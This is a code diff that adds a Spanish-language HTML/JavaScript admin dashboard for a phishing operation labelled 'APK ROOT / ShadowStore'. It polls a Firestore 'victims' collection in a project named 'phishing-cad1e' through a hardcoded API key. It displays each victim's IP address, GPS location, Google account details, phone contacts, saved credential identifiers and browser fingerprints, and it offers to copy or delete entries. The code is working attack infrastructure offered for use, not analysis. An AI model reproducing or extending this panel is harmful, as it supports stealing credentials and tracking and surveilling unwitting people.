@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ROOT — Admin Panel</title>
+<style>
+/* ══════════════════════════════════════════════════════════
+   ROOT DASHBOARD — APK ROOT / ShadowStore
+══════════════════════════════════════════════════════════ */
+:root {
+  --bg:      #080808;
+  --bg2:     #0f0f0f;
+  --bg3:     #161616;
+  --border:  #1e1e1e;
+  --accent:  #EE1D52;
+  --accent2: #69C9D0;
+  --text:    #c8c8c8;
+  --dim:     #444;
+  --green:   #22c55e;
+  --yellow:  #eab308;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  font-size: 0.88rem;
+  min-height: 100vh;
+}
+
+/* HEADER */
+header {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 14px 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  position: sticky; top: 0; z-index: 100;
+}
+.logo-txt { font-size: 1rem; font-weight: 700; letter-spacing: 2px; }
+.logo-txt span { color: var(--accent); }
+.status-dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: var(--dim); display: inline-block;
+  margin-right: 6px; transition: background 0.3s;
+}
+.status-dot.live { background: var(--green); animation: pulse 1.5s infinite; }
+@keyframes pulse {
+  0%,100% { opacity: 1; } 50% { opacity: 0.4; }
+}
+#status-txt { font-size: 0.78rem; color: var(--dim); }
+
+/* CONFIG OVERLAY */
+#cfg-overlay {
+  position: fixed; inset: 0;
+  background: rgba(0,0,0,0.96);
+  display: flex; align-items: center; justify-content: center;
+  z-index: 999;
+}
+.cfg-box {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 32px 28px;
+  width: 90%; max-width: 460px;
+}
+.cfg-box h2 { font-size: 1rem; margin-bottom: 6px; }
+.cfg-box p  { font-size: 0.76rem; color: var(--dim); margin-bottom: 22px; line-height: 1.5; }
+.cfg-field  { margin-bottom: 14px; }
+.cfg-field label { font-size: 0.7rem; color: var(--dim); letter-spacing: 1px; text-transform: uppercase; display: block; margin-bottom: 5px; }
+.cfg-field input {
+  width: 100%; background: var(--bg3); border: 1px solid var(--border);
+  border-radius: 7px; padding: 10px 12px; color: var(--text);
+  font-size: 0.84rem; outline: none; font-family: monospace;
+}
+.cfg-field input:focus { border-color: var(--accent); }
+.btn-connect {
+  width: 100%; background: var(--accent); color: #fff;
+  border: none; border-radius: 8px; padding: 13px;
+  font-size: 0.9rem; font-weight: 600; cursor: pointer;
+  letter-spacing: 0.5px; transition: opacity 0.2s;
+}
+.btn-connect:hover { opacity: 0.85; }
+
+/* STATS BAR */
+#stats-bar {
+  display: flex; gap: 1px; padding: 0;
+  background: var(--border); border-bottom: 1px solid var(--border);
+}
+.stat-cell {
+  flex: 1; background: var(--bg2);
+  padding: 12px 18px; text-align: center;
+}
+.stat-cell .sv { font-size: 1.4rem; font-weight: 700; color: var(--accent); }
+.stat-cell .sl { font-size: 0.65rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+
+/* MAIN */
+main { padding: 20px 20px; }
+#search-bar {
+  width: 100%; background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 8px; padding: 10px 14px; color: var(--text);
+  font-size: 0.84rem; outline: none; margin-bottom: 16px;
+}
+#search-bar:focus { border-color: var(--accent2); }
+#entries { display: flex; flex-direction: column; gap: 10px; }
+.empty-state {
+  text-align: center; color: var(--dim); padding: 60px 20px;
+  font-size: 0.82rem; line-height: 2;
+}
+.spinner-lg {
+  width: 36px; height: 36px; border: 3px solid var(--border);
+  border-top-color: var(--accent); border-radius: 50%;
+  animation: spin 0.8s linear infinite; margin: 0 auto 14px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ENTRY CARD */
+.entry-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 10px; overflow: hidden;
+  transition: border-color 0.2s;
+}
+.entry-card:hover { border-color: #2a2a2a; }
+.entry-card.new-ping { animation: newping 0.5s ease; }
+@keyframes newping {
+  0% { border-color: var(--accent); box-shadow: 0 0 16px rgba(238,29,82,0.3); }
+  100% { border-color: var(--border); box-shadow: none; }
+}
+.card-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 12px 16px; cursor: pointer; user-select: none;
+  background: var(--bg3); gap: 10px;
+}
+.card-header:hover { background: #1a1a1a; }
+.card-hash {
+  font-family: monospace; font-size: 0.82rem; color: var(--accent);
+  background: rgba(238,29,82,0.08); padding: 3px 8px; border-radius: 4px;
+  flex-shrink: 0;
+}
+.card-ip {
+  font-family: monospace; font-size: 0.84rem; color: var(--accent2);
+  font-weight: 600;
+}
+.card-loc { font-size: 0.76rem; color: var(--dim); flex: 1; }
+.card-ts  { font-size: 0.7rem; color: var(--dim); flex-shrink: 0; white-space: nowrap; }
+.card-arrow { color: var(--dim); font-size: 0.8rem; transition: transform 0.2s; }
+.card-arrow.open { transform: rotate(90deg); }
+
+.card-body { display: none; padding: 16px; border-top: 1px solid var(--border); }
+.card-body.open { display: block; }
+
+/* SECTION INSIDE CARD */
+.sec-title {
+  font-size: 0.65rem; color: var(--dim); text-transform: uppercase;
+  letter-spacing: 1.5px; margin: 14px 0 8px;
+  border-bottom: 1px solid var(--border); padding-bottom: 5px;
+}
+.sec-title:first-child { margin-top: 0; }
+.field-grid {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: 6px 20px;
+}
+.field-row { display: flex; flex-direction: column; padding: 4px 0; }
+.f-label { font-size: 0.63rem; color: #3a3a3a; text-transform: uppercase; letter-spacing: 0.8px; }
+.f-val   { font-size: 0.82rem; color: #bbb; word-break: break-all; margin-top: 2px; font-family: monospace; }
+.f-val.accent  { color: var(--accent); font-weight: 600; }
+.f-val.accent2 { color: var(--accent2); font-weight: 600; }
+.f-val.green   { color: var(--green); font-weight: 600; }
+.f-val.yellow  { color: var(--yellow); }
+
+/* MAP MINI */
+.map-link {
+  display: inline-flex; align-items: center; gap: 5px;
+  background: var(--bg3); border: 1px solid var(--border);
+  border-radius: 6px; padding: 7px 12px;
+  color: var(--accent2); font-size: 0.78rem; text-decoration: none;
+  margin-top: 8px; transition: border-color 0.2s;
+}
+.map-link:hover { border-color: var(--accent2); }
+
+/* ACTION BUTTONS */
+.card-actions { display: flex; gap: 8px; margin-top: 14px; flex-wrap: wrap; }
+.btn-sm {
+  background: var(--bg3); border: 1px solid var(--border);
+  color: var(--dim); padding: 7px 14px; border-radius: 6px;
+  font-size: 0.76rem; cursor: pointer; transition: all 0.2s;
+  letter-spacing: 0.5px;
+}
+.btn-sm:hover { border-color: var(--accent); color: var(--accent); }
+.btn-sm.red:hover { border-color: var(--accent); background: rgba(238,29,82,0.08); }
+</style>
+</head>
+<body>
+
+<!-- CONFIG OVERLAY -->
+<div id="cfg-overlay">
+  <div class="cfg-box">
+    <h2>// ROOT ADMIN</h2>
+    <p>Conecta con tu Firebase Firestore para ver las víctimas en tiempo real.
+    Encuentra estos datos en Firebase Console → Configuración del proyecto.</p>
+    <div class="cfg-field">
+      <label>API Key</label>
+      <input id="in-apikey" type="text" placeholder="AIzaSy..." autocomplete="off">
+    </div>
+    <div class="cfg-field">
+      <label>Project ID</label>
+      <input id="in-project" type="text" placeholder="mi-proyecto-abc" autocomplete="off">
+    </div>
+    <button class="btn-connect" onclick="connectFirebase()">CONECTAR →</button>
+  </div>
+</div>
+
+<!-- HEADER -->
+<header>
+  <div class="logo-txt"><span>ROOT</span> ADMIN</div>
+  <div style="display:flex;align-items:center;gap:16px;">
+    <span><span class="status-dot" id="dot"></span><span id="status-txt">desconectado</span></span>
+    <button class="btn-sm" onclick="showCfg()">⚙ Config</button>
+  </div>
+</header>
+
+<!-- STATS -->
+<div id="stats-bar">
+  <div class="stat-cell"><div class="sv" id="s-total">0</div><div class="sl">Total</div></div>
+  <div class="stat-cell"><div class="sv" id="s-hoy">0</div><div class="sl">Hoy</div></div>
+  <div class="stat-cell"><div class="sv" id="s-google">0</div><div class="sl">Google ID</div></div>
+  <div class="stat-cell"><div class="sv" id="s-tel">0</div><div class="sl">Teléfono</div></div>
+  <div class="stat-cell"><div class="sv" id="s-gps">0</div><div class="sl">GPS</div></div>
+</div>
+
+<main>
+  <input id="search-bar" placeholder="🔍  Buscar por IP, hash, email, país..." oninput="filterEntries()">
+  <div id="entries">
+    <div class="empty-state">
+      <div class="spinner-lg"></div>
+      Conecta Firebase para ver las entradas en tiempo real.
+    </div>
+  </div>
+</main>
+
+<script>
+// ══════════════════════════════════════════════════════════
+// ROOT ADMIN — APK ROOT / ShadowStore
+// ══════════════════════════════════════════════════════════
+
+let allEntries = [];   // {id, data}
+let PROJ = '', AKEY = '';
+
+// ── LocalStorage: recordar config ────────────────────────
+window.onload = () => {
+  // Config hardcodeada — se conecta directo sin pedir nada
+  PROJ = "phishing-cad1e";
+  AKEY = "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0";
+  document.getElementById('in-project').value = PROJ;
+  document.getElementById('in-apikey').value  = AKEY;
+  document.getElementById('cfg-overlay').style.display = 'none';
+  startListener();
+
+  const s = JSON.parse(localStorage.getItem('root_cfg') || '{}');
+  if (s.project && s.apikey && s.project !== PROJ) {
+    PROJ = s.project; AKEY = s.apikey;
+    startListener();
+  }
+};
+
+function showCfg() {
+  document.getElementById('cfg-overlay').style.display = 'flex';
+}
+
+function connectFirebase() {
+  PROJ = document.getElementById('in-project').value.trim();
+  AKEY = document.getElementById('in-apikey').value.trim();
+  if (!PROJ || !AKEY) { alert('Completa Project ID y API Key'); return; }
+  localStorage.setItem('root_cfg', JSON.stringify({ project: PROJ, apikey: AKEY }));
+  document.getElementById('cfg-overlay').style.display = 'none';
+  startListener();
+}
+
+// ── Firestore REST Polling (cada 4 seg) ─────────────────
+// (Alternativa al SDK para no necesitar módulos externos.
+// Cuando integres el SDK de Firebase puedes reemplazar esto
+// con onSnapshot() para streaming real.)
+let _pollTimer = null;
+
+async function startListener() {
+  setStatus('conectando...');
+  await poll();
+  _pollTimer = setInterval(poll, 4000);
+}
+
+async function poll() {
+  const url = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims?key=${AKEY}&pageSize=200&orderBy=_ts%20desc`;
+  try {
+    const r = await fetch(url);
+    if (!r.ok) throw new Error(r.status);
+    const j = await r.json();
+    const docs = j.documents || [];
+    const parsed = docs.map(d => ({
+      id:   d.name.split('/').pop(),
+      data: parseFirestoreDoc(d.fields)
+    }));
+    const prevLen = allEntries.length;
+    allEntries = parsed;
+    renderAll();
+    updateStats();
+    setStatus(`live — ${allEntries.length} entradas`);
+    // Ping visual si llegó nueva entrada
+    if (prevLen > 0 && allEntries.length > prevLen) {
+      const card = document.querySelector('.entry-card');
+      if (card) { card.classList.add('new-ping'); setTimeout(() => card.classList.remove('new-ping'), 600); }
+    }
+  } catch(e) {
+    setStatus('error: ' + e.message);
+  }
+}
+
+function parseFirestoreDoc(fields) {
+  if (!fields) return {};
+  const out = {};
+  for (const [k, v] of Object.entries(fields)) {
+    out[k] = v.stringValue ?? v.integerValue ?? v.doubleValue ??
+             v.booleanValue ?? v.timestampValue ?? '?';
+  }
+  return out;
+}
+
+function setStatus(msg) {
+  const dot = document.getElementById('dot');
+  const txt = document.getElementById('status-txt');
+  txt.textContent = msg;
+  dot.className   = msg.startsWith('live') ? 'status-dot live' : 'status-dot';
+}
+
+// ── STATS ────────────────────────────────────────────────
+function updateStats() {
+  const today = new Date().toDateString();
+  let hoy = 0, google = 0, tel = 0, gps = 0;
+  for (const { data: d } of allEntries) {
+    if (new Date(Number(d._ts)).toDateString() === today) hoy++;
+    if (d.google_email && d.google_email !== '?') google++;
+    if (d.contact_tel  && d.contact_tel  !== '?') tel++;
+    if (d.gps_lat      && d.gps_lat      !== '?') gps++;
+  }
+  document.getElementById('s-total').textContent  = allEntries.length;
+  document.getElementById('s-hoy').textContent    = hoy;
+  document.getElementById('s-google').textContent = google;
+  document.getElementById('s-tel').textContent    = tel;
+  document.getElementById('s-gps').textContent    = gps;
+}
+
+// ── FILTER ───────────────────────────────────────────────
+function filterEntries() {
+  const q = document.getElementById('search-bar').value.toLowerCase();
+  renderAll(q);
+}
+
+// ── RENDER ALL ───────────────────────────────────────────
+function renderAll(filter = '') {
+  const container = document.getElementById('entries');
+  const filtered  = filter
+    ? allEntries.filter(({ data: d }) =>
+        Object.values(d).some(v => String(v).toLowerCase().includes(filter))
+      )
+    : allEntries;
+
+  if (filtered.length === 0) {
+    container.innerHTML = `<div class="empty-state">
+      ${filter ? '🔍 Sin resultados para "' + filter + '"' : `<div class="spinner-lg"></div>Esperando víctimas...`}
+    </div>`;
+    return;
+  }
+
+  container.innerHTML = filtered.map(({ id, data: d }) => buildCard(id, d)).join('');
+}
+
+// ── BUILD CARD ───────────────────────────────────────────
+function buildCard(id, d) {
+  const ts   = d._ts ? new Date(Number(d._ts)).toLocaleString('es') : '?';
+  const ip   = d.ip_public  || d.ip_local || '?';
+  const loc  = [d.ip_city, d.ip_country].filter(x => x && x !== '?').join(', ') || '';
+  const hash = d.compositeHash || id.slice(0,8);
+
+  const hasGoogle  = d.google_email && d.google_email !== '?';
+  const hasTel     = d.contact_tel  && d.contact_tel  !== '?';
+  const hasGPS     = d.gps_lat      && d.gps_lat      !== '?';
+
+  const badges = [
+    hasGoogle ? `<span style="color:var(--green);font-size:0.7rem">●G</span>` : '',
+    hasTel    ? `<span style="color:var(--accent2);font-size:0.7rem">●📱</span>` : '',
+    hasGPS    ? `<span style="color:var(--yellow);font-size:0.7rem">●GPS</span>` : '',
+  ].filter(Boolean).join(' ');
+
+  const gpsLink = hasGPS
+    ? `<a class="map-link" href="https://maps.google.com/?q=${d.gps_lat},${d.gps_lon}" target="_blank">🗺 Ver en mapa (${Number(d.gps_lat).toFixed(5)}, ${Number(d.gps_lon).toFixed(5)})</a>`
+    : '';
+
+  // Secciones de datos
+  const rows = (fields) => fields.map(([k, v, cls]) => {
+    const val = (d[k] !== undefined && d[k] !== null && d[k] !== '?')
+                ? String(d[k]).slice(0, 260) : '—';
+    return `<div class="field-row">
+      <span class="f-label">${k}</span>
+      <span class="f-val ${cls||''}">${val}</span>
+    </div>`;
+  }).join('');
+
+  return `
+<div class="entry-card" id="card-${id}">
+  <div class="card-header" onclick="toggleCard('${id}')">
+    <span class="card-hash">${hash}</span>
+    <span class="card-ip">${ip}</span>
+    <span class="card-loc">${loc} ${badges}</span>
+    <span class="card-ts">${ts}</span>
+    <span class="card-arrow" id="arr-${id}">▶</span>
+  </div>
+  <div class="card-body" id="body-${id}">
+
+    <div class="sec-title">🌐 Red / IP</div>
+    <div class="field-grid">
+      ${rows([
+        ['ip_public','','accent'],
+        ['ip_local','','accent'],
+        ['ip_local2','',''],
+        ['ip_city','',''],
+        ['ip_region','',''],
+        ['ip_country','',''],
+        ['ip_org','',''],
+        ['ip_asn','',''],
+        ['ip_postal','',''],
+        ['ip_timezone','',''],
+        ['ip_lat','','dim'],
+        ['ip_lon','','dim'],
+      ])}
+    </div>
+
+    ${gpsLink}
+
+    ${hasGPS ? `
+    <div class="sec-title">📍 GPS Real</div>
+    <div class="field-grid">
+      ${rows([
+        ['gps_lat','','green'],
+        ['gps_lon','','green'],
+        ['gps_accuracy','',''],
+        ['gps_altitude','',''],
+        ['gps_speed','',''],
+        ['gps_heading','',''],
+      ])}
+    </div>` : ''}
+
+    ${hasGoogle ? `
+    <div class="sec-title">🔑 Cuenta Google</div>
+    <div class="field-grid">
+      ${rows([
+        ['google_email','','accent'],
+        ['google_name','',''],
+        ['google_hd','',''],
+        ['google_sub','','dim'],
+        ['google_prompt_status','','dim'],
+      ])}
+    </div>` : ''}
+
+    ${hasTel || d.contact_email ? `
+    <div class="sec-title">📱 Contacto / Teléfono</div>
+    <div class="field-grid">
+      ${rows([
+        ['contact_name','',''],
+        ['contact_tel','','accent2'],
+        ['contact_email','',''],
+        ['contacts_status','','dim'],
+      ])}
+    </div>` : ''}
+
+    ${d.saved_credential_id ? `
+    <div class="sec-title">🗝 Credenciales guardadas</div>
+    <div class="field-grid">
+      ${rows([
+        ['saved_credential_id','','accent'],
+        ['saved_credential_name','',''],
+        ['saved_credential_type','','dim'],
+      ])}
+    </div>` : ''}
+
+    <div class="sec-title">🖥 Dispositivo</div>
+    <div class="field-grid">
+      ${rows([
+        ['userAgent','',''],
+        ['platform','',''],
+        ['vendor','',''],
+        ['screen','',''],
+        ['devicePixelRatio','',''],
+        ['orientationType','',''],
+        ['colorDepth','',''],
+        ['hardwareConcurrency','',''],
+        ['deviceMemory','',''],
+        ['batteryLevel','',''],
+        ['batteryCharging','',''],
+        ['maxTouchPoints','',''],
+      ])}
+    </div>
+
+    <div class="sec-title">🌍 Idioma / Zona</div>
+    <div class="field-grid">
+      ${rows([
+        ['language','',''],
+        ['languages','',''],
+        ['timezone','',''],
+        ['timezoneOffset','',''],
+        ['locale','',''],
+        ['dateLocal','','dim'],
+        ['prefersDark','',''],
+        ['prefersLight','',''],
+      ])}
+    </div>
+
+    <div class="sec-title">⚙ Red/Conectividad</div>
+    <div class="field-grid">
+      ${rows([
+        ['connectionType','',''],
+        ['connectionEffective','',''],
+        ['connectionDownlink','',''],
+        ['connectionRtt','',''],
+        ['connectionSaveData','',''],
+        ['onLine','',''],
+        ['storageQuota','',''],
+        ['storageUsed','',''],
+      ])}
+    </div>
+
+    <div class="sec-title">🎨 Fingerprint</div>
+    <div class="field-grid">
+      ${rows([
+        ['compositeHash','','accent'],
+        ['canvasFingerprint','','dim'],
+        ['audioFingerprint','','dim'],
+        ['webglUnmaskedRenderer','',''],
+        ['webglUnmaskedVendor','',''],
+        ['webglVersion','','dim'],
+        ['fonts','','dim'],
+        ['fontCount','',''],
+        ['webGPU','',''],
+        ['webAssembly','',''],
+        ['bluetooth','',''],
+        ['nfc','',''],
+        ['notifications','',''],
+      ])}
+    </div>
+
+    <div class="sec-title">🔗 Referencia</div>
+    <div class="field-grid">
+      ${rows([
+        ['referer','',''],
+        ['href','','dim'],
+        ['searchParams','','dim'],
+        ['_ts','','dim'],
+      ])}
+    </div>
+
+    <div class="card-actions">
+      <button class="btn-sm" onclick="copyEntry('${id}')">📋 Copiar JSON</button>
+      <button class="btn-sm red" onclick="deleteEntry('${id}')">🗑 Eliminar</button>
+      ${hasGPS ? `<a class="btn-sm" style="text-decoration:none" href="https://maps.google.com/?q=${d.gps_lat},${d.gps_lon}" target="_blank">🗺 Mapa</a>` : ''}
+    </div>
+  </div>
+</div>`;
+}
+
+// ── TOGGLE CARD ──────────────────────────────────────────
+function toggleCard(id) {
+  const body = document.getElementById('body-'+id);
+  const arr  = document.getElementById('arr-'+id);
+  body.classList.toggle('open');
+  arr.classList.toggle('open');
+}
+
+// ── COPY ENTRY ───────────────────────────────────────────
+function copyEntry(id) {
+  const entry = allEntries.find(e => e.id === id);
+  if (!entry) return;
+  const txt = JSON.stringify(entry.data, null, 2);
+  navigator.clipboard?.writeText(txt).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = txt;
+    document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+  const btn = document.querySelector(`#card-${id} .btn-sm`);
+  if (btn) { btn.textContent = '✓ Copiado'; setTimeout(() => btn.textContent = '📋 Copiar JSON', 1500); }
+}
+
+// ── DELETE ENTRY ─────────────────────────────────────────
+async function deleteEntry(id) {
+  if (!confirm('¿Eliminar esta entrada?')) return;
+  const url = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims/${id}?key=${AKEY}`;
+  try {
+    await fetch(url, { method: 'DELETE' });
+    allEntries = allEntries.filter(e => e.id !== id);
+    renderAll();
+    updateStats();
+  } catch(e) { alert('Error al eliminar: ' + e.message); }
+}
+</script>
+</body>
+</html>
